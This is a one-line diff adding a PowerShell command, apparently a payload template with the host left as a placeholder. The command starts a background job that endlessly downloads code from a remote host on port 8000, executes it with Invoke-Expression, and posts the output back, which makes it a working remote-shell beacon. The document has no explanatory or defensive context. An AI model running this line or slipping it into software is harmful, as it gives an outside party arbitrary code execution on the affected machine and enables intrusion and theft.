@@ -1,0 +1,1 @@
+Start-Job -ScriptBLock{while ($true){$c=IEX(Invoke-WebRequest -Uri "http://{}:8000").Content;$r=Invoke-WebRequest -Uri "http://{}:8000" -Method POST -Body $c}}
